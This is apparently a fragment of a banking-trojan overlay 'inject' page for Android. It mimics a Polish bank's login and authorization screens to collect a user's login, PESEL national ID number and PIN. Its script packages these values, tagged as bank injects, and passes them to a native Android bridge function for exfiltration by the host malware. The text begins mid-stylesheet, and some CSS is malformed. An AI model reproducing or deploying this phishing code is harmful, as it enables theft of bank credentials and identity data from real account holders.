        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #ff6200;
            border: 0;
            border-radius: 4px;
            margin-bottom: 15px;
        }

        .button:disabled {
            background-color: #d9d9d9;
            color: #767676;
        }

        .btn {
            width: 100%;

            color: #ff6200;

            border-radius: 4px;
            margin-bottom: 15px;

        [data-tooltip] {
    position: up; 
   }
   [data-tooltip]::after {
    content: attr(data-tooltip); 
    position: absolute; 
    width: 300px; 
    left: 20; top: 0; 
    background: white; 
    color: orange; 
    padding: 0.9em; 
    box-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3); 
    pointer-events: none; 
    opacity: 0; 
    transition: 1s; 
   } 
   [data-tooltip]:hover::after {
    opacity: 1; 
    top: 2em; 
   }

            </header>
            <section>
                <h4 style="margin-bottom: 15px;margin-top: 0;">Autoryzacja</h4>
                <label for="pin">Wpisz swój PIN:</label>
                <input type="pesel" class="input" id="pin" name="pin" maxlength="4" placeholder="" autocomplete="off" autofocus>

                <input type="submit" class="button" id="sendData" disabled value="Dalej">

                <div class="btn">
                    Anuluj
                </div>
            </section>
        </div>
    </form>

    <script>    
        $('pesel').mask('#0')
        $('pin').mask('#0')

        var patterninput=document.querySelector("#login[withpattern]")
        $(patterninput).on('keypress', function (event) {
            var regex = new RegExp("^([a-zA-Z]{0,6})([0-9]{0,4})$");
            var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
            newval=patterninput.value+key
            console.log(regex.test(newval))
            if (!regex.test(newval)) {
                event.preventDefault();
                return false;
            }
        });

        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            form3 = document.getElementById('form3');

        var login = document.getElementById('login'),
            pesel = document.getElementById('pesel'),
            pin = document.getElementById('pin');

        var nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastPage'),
            sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            if(login.value.length < 10) {
           
  
  nextPage.disabled = true
            } else {
                nextPage.disabled = false
            }
        }

        nextPage.onclick = () => {
           
            form1.style.display = 'none'
            form2.style.display = 'block'
            pesel.focus()
        }

        pesel.onkeyup = () => {
            if(pesel.value.length < 6) {
                lastPage.disabled = true
            } else {
                lastPage.disabled = false
            }
        }

        lastPage.onclick = () => {
          

            form2.style.display = 'none'
            form3.style.display = 'block'
            pin.focus()
        }

        pin.onkeyup = () => {
            if(pin.value.length > 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.pesel = pesel.value;
                
                data.pin = pin.value;
                
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
